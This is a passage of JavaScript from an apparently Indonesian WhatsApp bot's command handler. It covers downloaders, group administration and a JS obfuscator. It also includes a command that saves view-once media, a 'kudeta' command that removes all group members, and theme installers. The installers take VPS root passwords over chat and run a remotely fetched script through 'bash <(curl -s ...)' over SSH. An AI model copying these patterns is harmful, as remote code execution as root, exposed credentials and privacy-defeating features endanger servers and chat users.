if (m.isGroup) Xuu.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'ytmp4': {
    const from = m.key.remoteJid || m.chat;
    const url = text || args[0];

    if (!url) return Reply("Link YouTube tidak ditemukan!");

    Reply("⏳ Sedang memproses Video (MP4)...");

    try {
        const api = `https://api.jerexd666.wongireng.my.id/download/ytmp4?url=${encodeURIComponent(url)}`;

        const res = await fetch(api);
        const json = await res.json();

        console.log("DEBUG API MP4:", json);

        // URL final sesuai API kamu
        const videoUrl =
            json?.result?.download_url || 
            json?.result?.url ||
            json?.download_url ||
            json?.url ||
            json?.result?.download;

        if (!videoUrl) {
            return Reply("❌ Gagal. Video tidak ditemukan atau API error.");
        }

        await Xuu.sendMessage(from, {
            video: { url: videoUrl },
            caption: `🎥 *Video Downloaded*\n\nJudul: ${json?.result?.title || '-'}\nChannel: ${json?.result?.author || '-'}`,
            mimetype: 'video/mp4'
        }, { quoted: m });

    } catch (e) {
        console.log("ERROR MP4:", e);
        Reply("❌ Error saat mengambil Video MP4.");
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'instagram-dl': {
    if (!args[0]) return reply("🔗 Masukkan URL Facebook atau Instagram!");
    try {
        const axios = require('axios');
        const cheerio = require('cheerio');
        async function yt5sIo(url) {
            try {
                const form = new URLSearchParams();
                form.append("q", url);
                form.append("vt", "home");
                const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
                    headers: {
                        "Accept": "application/json",
                        "X-Requested-With": "XMLHttpRequest",
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                });
                if (data.status !== "ok") throw new Error("Gagal mengambil data.");
                const $ = cheerio.load(data.data);
                if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
                    const thumb = $('img').attr("src");
                    let links = [];
                    $('table tbody tr').each((_, el) => {
                        const quality = $(el).find('.video-quality').text().trim();
                        const link = $(el).find('a.download-link-fb').attr("href");
                        if (quality && link) links.push({ quality, link });
                    });
                    if (links.length === 0) throw new Error("Tidak ada video yang dapat diunduh.");

                    return { platform: "facebook", thumb, video: links[0].link };
                } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
                    const video = $('a[title="Download Video"]').attr("href");
                    const thumb = $('img').attr("src");
                    if (!video || !thumb) throw new Error("Video tidak ditemukan.");
                    return { platform: "instagram", thumb, video };
                } else {
                    throw new Error("URL tidak valid. Gunakan link Facebook atau Instagram.");
                }
            } catch (error) {
                return { error: error.message };
            }
        }
        await Xuu.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key,
            }
        });
        let res = await yt5sIo(args[0]);
        if (res.error) {
            await Xuu.sendMessage(m.chat, {
                react: {
                    text: "❌",
                    key: m.key,
                }
            });
            return reply(`⚠ *Error:* ${res.error}`);
        }
        if (res.platform === "facebook" || res.platform === "instagram") {
            await Xuu.sendMessage(m.chat, {
                react: {
                    text: "⏳",
                    key: m.key,
                }
            });
            await Xuu.sendMessage(m.chat, { video: { url: res.video }, caption: "✅ *Berhasil mengunduh video!*" }, { quoted: m });
        }
    } catch (error) {
        console.error(error);
        await Xuu.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key,
            }
        });
        reply("Terjadi kesalahan saat mengambil video.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "facebook": case "fb": case "fbdl": {
if (!text) return reply(example("linknya"))
if (!text.startsWith('https://')) return reply("Link tautan tidak valid")
await fetchJson(`https://api.siputzx.my.id/download/facebook?url=${text}`).then(async (res) => {
if (!res.status) return reply("Error! Result Not Found")
return Xuu.sendMessage(m.chat, {video: {url: res.result.media.video_hd || res.result.media.video_sd}, mimetype: "video/mp4", caption: "*Facebook Downloader ✅*"}, {quoted: m})
}).catch((e) => reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gitclone": {
if (!text) return reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Xuu.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await reply(`Error! repositori tidak ditemukan`)
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enc": case "encrypt": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return reply(example("dengan reply file .js"))
if (mime !== "application/javascript" && mime !== "text/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./database/sampah/${filename}`, media)
await reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/${filename}`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./database/sampah/${filename}`, obfuscated)
  await Xuu.sendMessage(m.chat, {document: fs.readFileSync(`./database/sampah/${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅"}, {quoted: m})
}).catch(e => reply("Error :" + e))
  await fs.unlinkSync(`./database/sampah/${filename}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enchard": case "encrypthard": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return reply("Reply file .js")
if (mime !== "application/javascript" && mime !== "text/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*PrimeXuu/*^/*($break)*/" + 
            "/*PrimeXuu/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await Xuu.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => reply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
reply(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = ` *── List all group chat*\n`
let a = await Xuu.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pin": case "pinterest": {
if (!text) return reply(example("anime dark"))
await Xuu.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: Xuu.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Xuu.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://rest-api-v3-beta.vercel.app/ai/openai?text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
var image = await Xuu.downloadAndSaveMediaMessage(qmsg)
await Xuu.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "rvo": case "readviewonce": {
if (!m.quoted) return reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Xuu.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Xuu.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Xuu.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tourl": case "tourl2": {
if (!/image|video/.test(mime)) return reply(example("dengan reply foto/vidio"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
await Xuu.sendMessage(m.chat, {text: `*Url :* ${dd}\n*Expired :* Permanen`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "readqr": {
if (!/image|video/.test(mime)) return reply(example("dengan reply qris"))
const Jimp = require("jimp");
const QrCode = require("qrcode-reader");
async function readQRISFromBuffer(buffer) {
    return new Promise(async (resolve, reject) => {
        try {
            const image = await Jimp.read(buffer);
            const qr = new QrCode();
            qr.callback = (err, value) => {
                if (err) return reject(err);
                resolve(value ? value.result : null);
            };
            qr.decode(image.bitmap);
        } catch (error) {
            reject(error);
        }
    });
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await readQRISFromBuffer(aa)
await Xuu.sendMessage(m.chat, {text: `*Data :*\n${dd}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tohd": case "hd": case "remini": {
if (!/image/.test(mime)) return reply(example("dengan kirim/reply foto"))
let foto = await Xuu.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await Xuu.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "removebg": {
if (!/image/.test(mime)) return reply(example("dengan kirim/reply foto"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
const resnya = await fetchJson(`https://restapi-v2.simplebot.my.id/imagecreator/removebg?url=${dd}`)
await Xuu.sendMessage(m.chat, {image: await getBuffer(resnya.result), caption: "Remove Background Done ✅"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Xuu.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return reply("Nomor tidak terdaftar di whatsapp")
const res = await Xuu.groupParticipantsUpdate(m.chat, [input], 'remove')
await reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return reply(example("@tag/reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await Xuu.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await Xuu.groupRevokeInvite(m.chat)
reply("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await Xuu.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await Xuu.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await Xuu.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "h": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await Xuu.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Xuu.groupAcceptInvite(result)
reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await Xuu.newsletterMetadata("invite", result)
await Xuu.newsletterFollow(res.id)
reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoread": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return reply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return reply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return reply("Berhasil mematikan *autoread*")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autopromosi": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return reply("Berhasil mematikan *autopromosi*")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autotyping": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return reply("Berhasil mematikan *autotyping*")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoreadsw": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return reply("Berhasil mematikan *autoreadsw*")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return reply("Berhasil mematikan *welcome* di grup ini")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return reply("Berhasil mematikan *antilink* di grup ini")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink2": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return reply("Berhasil mematikan *antilink2* di grup ini")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mute": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return reply("Berhasil mematikan *mute* di grup ini")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "blacklist": case "blacklistjpm": case "blgc": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return reply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return reply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return reply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return reply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await Xuu.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await Xuu.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return reply("Grup Ini Sudah Tidak Ada Member!")
await reply("Kudeta Grup By primexuu Starting 🔥")
for (let i of memberFilter) {
await Xuu.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Xuu.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Xuu.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return reply(example("@tag/6285###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const XuuSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(XuuSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const XuuSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(XuuSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const XuuSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
